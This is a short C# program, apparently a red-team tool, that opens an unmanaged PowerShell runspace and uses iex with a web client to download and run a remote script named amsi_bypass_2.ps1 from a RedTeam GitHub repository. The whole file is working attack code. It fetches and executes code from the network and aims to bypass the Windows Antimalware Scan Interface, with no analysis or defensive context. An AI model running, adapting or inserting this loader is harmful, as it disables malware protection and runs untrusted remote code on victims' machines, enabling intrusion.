using System;
using System.Management.Automation;		
using System.Management.Automation.Runspaces;
  
namespace Bypass
	{
		class Program
			{
			static void Main(string[] args)
				{
				Runspace rs = RunspaceFactory.CreateRunspace();
				rs.Open();
		
				PowerShell ps = PowerShell.Create();
				ps.Runspace = rs;

				String cmd = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/dottorvenom/RedTeam/main/amsi_bypass_2.ps1') | IEX;";
				ps.AddScript(cmd);
				ps.Invoke();
				rs.Close();


				}
			}
	}
